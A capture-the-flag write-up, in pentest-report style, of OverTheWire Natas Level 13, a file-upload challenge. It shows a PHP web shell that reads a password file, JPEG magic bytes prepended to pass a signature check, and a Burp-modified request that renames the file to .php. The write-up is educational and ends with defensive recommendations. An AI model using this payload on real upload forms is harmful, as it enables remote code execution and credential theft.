# 🏴󠁡󠁦󠁷󠁡󠁲󠁿**Natas Challenge - Level 13**

**Prepared by:** Nishanth Antony  
**Date:** November 07, 2025  
**Difficulty:** Easy    
**Category:** Web Exploitation  
**Platform:** Over The Wire  

---

## **Executive Summary**
This walkthrough documents the assessment of **Natas Level 13**, a medium-difficulty web security challenge focused on **file upload validation bypass** using **magic byte manipulation**. The objective was to retrieve the password for **Natas Level 14** by uploading a malicious PHP script disguised as a valid image. The assessment revealed a **critical vulnerability** where the application validated **file signatures (magic bytes)** to enforce image uploads but failed to prevent **extension manipulation** post-upload. This allowed execution of arbitrary PHP code. The vulnerability was rated **Critical Severity** due to **remote code execution (RCE)** and direct credential disclosure.

**Key Findings:**
- Upload function validates **JPEG magic bytes** (`FF D8 FF DB`) but not file content.
- Server assigns predictable filenames and allows **extension override** via HTTP request.
- No execution restrictions in upload directory.
- Bypassed signature check using a hex editor and executed PHP via `.php` extension.

**Recommendations:**
- Validate **both magic bytes and full file content**.
- Enforce **MIME type consistency** between request and file.
- Disable PHP execution in upload directories.
- Use **randomized, non-executable file paths**.

---

## **Introduction**

### **Background**
Natas is an educational web security challenge series hosted by OverTheWire, teaching progressive web vulnerabilities. Each level requires obtaining a password to advance, simulating real-world penetration testing.

### **Objective**
Exploit a file upload vulnerability to upload and execute a PHP web shell, retrieving the **Natas Level 14 password** from `/etc/natas_webpass/natas14`.

### **Scope**
- **Target:** `http://natas13.natas.labs.overthewire.org`
- **Assessment Type:** White-box (source inspection allowed)
- **Exclusions:** No brute-forcing or external tools beyond browser and Burp Suite

---

## **Methodology**
The assessment followed **OWASP Testing Guide** and **PTES** methodologies. Tools used: **Google Chrome**, **Burp Suite**, and a **hex editor**.

### **Step 1: Reconnaissance**
- Accessed upload form.
- Tested with a real `.jpg` → accepted.
- Tested with PHP file → rejected with message implying **signature validation**.

### **Step 2: Signature Bypass Development**
- Created a minimal PHP shell:
  ```php
  <?php system("cat /etc/natas_webpass/natas14"); ?>
  ```
- Opened in **hex editor** (e.g., HxD).
- **Prepended JPEG magic bytes**: `FF D8 FF DB` at the beginning.
- Saved as `shell.jpg`.

### **Step 3: Upload & Request Manipulation**
- Intercepted upload request in **Burp Suite**.
- Modified:
  ```http
  filename="shell.jpg" → filename="shell.php"
  ```
- Forwarded request → upload succeeded.

### **Step 4: Code Execution**
- Accessed uploaded file:
  ```
  http://natas13.natas.labs.overthewire.org/uploadXXXXXX.php
  ```
- PHP code executed → displayed **Level 14 password**.

### **Tools Utilized**
- **Burp Suite** – Request interception and modification
- **Hex Editor (HxD)** – Magic byte injection
- **Web Browser** – File upload and execution

---

## **Findings**

### **Vulnerability Details**

| **Vulnerability** | **Type** | **CWE** | **Severity** | **CVSS Score** |
|-------------------|--------|--------|--------------|----------------|
| File Upload Bypass | Remote Code Execution | CWE-434 | Critical | 9.8 |

#### **Magic Byte Validation Bypass (CWE-434)**
- **Description:** Application checks first 4 bytes for `FF D8 FF DB` (JPEG) but does **not** validate:
  - Full file structure
  - MIME type consistency
  - Execution permissions
- **Proof of Concept:**
  1. Create PHP file with `<?php system("cat /etc/natas_webpass/natas14"); ?>`
  2. Prepend `FF D8 FF DB` in hex editor.
  3. Upload as `.jpg`, intercept, change to `.php`.
  4. Access → RCE.

---

## **Solution and Exploitation**

**Malicious File (Hex View - First 16 Bytes):**
```
FF D8 FF DB 3C 3F 70 68 70 20 73 79 73 74 65 6D
```
→ `FF D8 FF DB` = JPEG header  
→ `3C 3F 70 68 70` = `<?php`

**Burp Suite Modified Request:**
```http
POST /index.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: image/jpeg

ÿØÿÛ<?php system("cat /etc/natas_webpass/natas14"); ?>
------WebKitFormBoundary--
```

**Output:**
```html
<pre>[Level 14 password redacted]</pre>
```

> **Extracted Artifact:** Password for Level 14 (redacted)

---

## **Learnings and Recommendations**

### **Key Learnings**
- **Magic bytes alone are insufficient** — attackers can prepend valid headers.
- **MIME type must match file content** — `image/jpeg` with PHP is a red flag.
- **Extension manipulation post-upload** defeats client-side checks.
- **Execution in upload dirs** must be disabled.

### **Recommendations**

| **Timeline** | **Action** |
|--------------|-----------|
| **Short-Term** | Disable PHP execution: `php_flag engine off` in `.htaccess` |
| | Validate **full file** using `finfo_file()` |
| **Long-Term** | 
- Store uploads **outside web root**
- Use **UUID filenames** + **database mapping**
- Enforce **strict MIME + magic + extension** consistency
- Deploy **file upload scanners** (e.g., ClamAV, libmagic)

**Mitigation Controls:**
- WAF rules blocking `.php` in uploads
- File entropy analysis
- Sandboxed upload processing

---

## **Conclusion**
**Natas Level 13** illustrates a **sophisticated yet realistic** file upload bypass using **magic byte spoofing** and **request tampering**. While the application improved over Level 12 by adding **signature checks**, it failed to enforce **comprehensive validation**, allowing **full RCE**.

**Core Lesson:**  
> **Never trust file type based on headers alone. Validate content, enforce execution policies, and isolate uploads.**

For production systems, **multi-layered validation**, **secure storage**, and **regular VAPT** are essential to prevent such critical exploits.

---
